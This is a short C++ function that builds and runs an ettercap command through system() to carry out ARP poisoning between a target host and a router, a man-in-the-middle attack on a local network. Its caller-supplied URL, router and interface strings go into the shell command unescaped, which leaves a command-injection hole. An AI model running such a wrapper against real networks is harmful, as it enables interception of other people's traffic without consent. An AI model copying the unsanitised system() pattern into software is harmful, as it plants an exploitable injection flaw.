#include <iostream>
#include <cstdlib>
#include <string>

void ettercap(const std::string& url, const std::string& router, const std::string& interface) {
    char command[256];
    snprintf(command, sizeof(command), "ettercap -T -q -i %s -M arp:remote /%s// /%s//", interface.c_str(), url.c_str(), router.c_str());
    int result = system(command);
}

